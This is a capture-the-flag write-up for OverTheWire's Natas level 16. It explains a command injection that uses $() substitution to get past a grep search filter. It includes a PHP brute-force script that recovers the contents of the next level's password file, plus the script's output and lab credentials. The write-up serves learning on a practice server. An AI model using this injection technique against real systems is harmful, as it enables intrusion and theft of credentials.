# ctf
CTF - cracking wargames

# Natas16

## Notes

1.  The aim of this level is to read the password in the file `/etc/natas_webpass/natas17`

1.	This level is like previous levels (9, 10) where we have a search form to grep contents from `dictionary.txt`. But this time they've made it more challenging:

		For security reasons, we now filter even more on certain characters

2.	Viewing the source reveals what tricks they are using:

		if (preg_match('/[;|&`\'"]/',$key)) {
		    print "Input contains an illegal character!";
		} else {
		    passthru("grep -i \"$key\" dictionary.txt");
		}
    
3.  To break out of the inner quotes for key, we can have bash evaluate an expression for us, like so:

		$(grep a /etc/natas_webpass/natas17)

4.  If the password contains `a` it is returned by `grep`, and since that result don't match anything in a dictionary, the result is empty.

5. As the grep above won't tell us _where_ in the password `a` is, we can instead use regex `.` to brute force the password, starting with `a...............................`:

		$(grep a............................... /etc/natas_webpass/natas17)
    
6. Brute forcing is of course easier with a script (here using simple html dom lib):

		<?php
		    include('simple_html_dom.php');

		    function find($key) {
		        $url = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/?needle=$(grep%20' . $key . '%20/etc/natas_webpass/natas17)&submit=Search';
		        $html = file_get_html($url);
		        return (strlen($html->find('pre')[0]->plaintext) < 10);
		    }

		    $key = "................................";

		    for ($i = 0; $i < 32; $i++) {
		        foreach(array_merge(range(0, 9), range('A', 'Z'), range('a', 'z')) as $c) {
		            $key[$i] = $c;
		            if (find($key)) {
		                print $key . "<br>";
		                break;  
		            }
		        }
		    }
		?>
    
7. This gives us the following result, ending with the password for `natas17`:

		8...............................
		8P..............................
		8Ps.............................
		8Ps3............................
		8Ps3H...........................
		8Ps3H0..........................
		8Ps3H0G.........................
		8Ps3H0GW........................
		8Ps3H0GWb.......................
		8Ps3H0GWbn......................
		8Ps3H0GWbn5.....................
		8Ps3H0GWbn5r....................
		8Ps3H0GWbn5rd...................
		8Ps3H0GWbn5rd9..................
		8Ps3H0GWbn5rd9S.................
		8Ps3H0GWbn5rd9S7................
		8Ps3H0GWbn5rd9S7G...............
		8Ps3H0GWbn5rd9S7Gm..............
		8Ps3H0GWbn5rd9S7GmA.............
		8Ps3H0GWbn5rd9S7GmAd............
		8Ps3H0GWbn5rd9S7GmAdg...........
		8Ps3H0GWbn5rd9S7GmAdgQ..........
		8Ps3H0GWbn5rd9S7GmAdgQN.........
		8Ps3H0GWbn5rd9S7GmAdgQNd........
		8Ps3H0GWbn5rd9S7GmAdgQNdk.......
		8Ps3H0GWbn5rd9S7GmAdgQNdkh......
		8Ps3H0GWbn5rd9S7GmAdgQNdkhP.....
		8Ps3H0GWbn5rd9S7GmAdgQNdkhPk....
		8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq...
		8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9..
		8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c.
		8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
